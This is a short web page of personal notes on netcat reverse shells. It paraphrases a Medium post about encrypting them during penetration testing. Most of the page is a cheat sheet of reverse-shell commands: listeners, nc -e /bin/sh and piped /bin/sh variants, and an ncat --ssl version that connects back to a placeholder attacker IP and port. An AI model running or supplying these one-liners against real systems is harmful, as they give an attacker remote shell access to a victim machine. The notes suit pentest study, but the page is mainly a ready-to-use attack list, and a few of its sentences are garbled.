<title>Netcat</title>
</head><body>https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c<br/>
In many tutorials and unfortunately also in the productive environment, netcat ( nc ) is used to establish a connection between the attacker system and the target system. The attacker starts with nc -lvp &lt;PORT&gt; a listener and spawns with nc -e /bin/sh &lt;ATTACKER-IP&gt; &lt;PORT&gt; a shell on the target system. The problem is that this connection is unencrypted. All data that is transported via this reverse shell (passwords, keys, personal data, critical company internal information, etc.) are published more or less. This is not acceptable in the field of penetration testing.<br/>
<br/>
The connection for the reverse shell should therefore be encrypted.<br/>
<br/>
As an alternative to nc there is ncat . The problem is, however, that ncat is not installed on every Linux just so. That is, It must often be loaded as <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat">static binary</a>&nbsp;(GitHub, 3MB!). This is a bit tedious for a long time, but works the same way:<br/>
<br/>
Listener: ncat --ssl -l &lt;PORT&gt;<br/>
Shell: ncat --ssl &lt;ATTACKER-IP&gt; &lt;PORT&gt; -c /bin/sh<br/>
<br/>
Look to openssl as an alterative<br/>
<br/>
<br/>
LISTEN WITH: nc -lvvnp &lt;LPORT&gt;<br/>
<br/>
/bin/sh | nc &lt;LIP&gt; &lt;LPORT&gt;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;no -e, but needs pipe<br/>
nc -e /bin/sh &lt;LIP&gt; &lt;LPORT&gt;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;relies on being able to use the -e argument<br/>
/usr/local/bin/nc &lt;LIP&gt; &lt;LPORT&gt; -e '/bin/bash'&#09;&#09;&#09;&#09;&#09;using the full path of netcat (default)<br/>
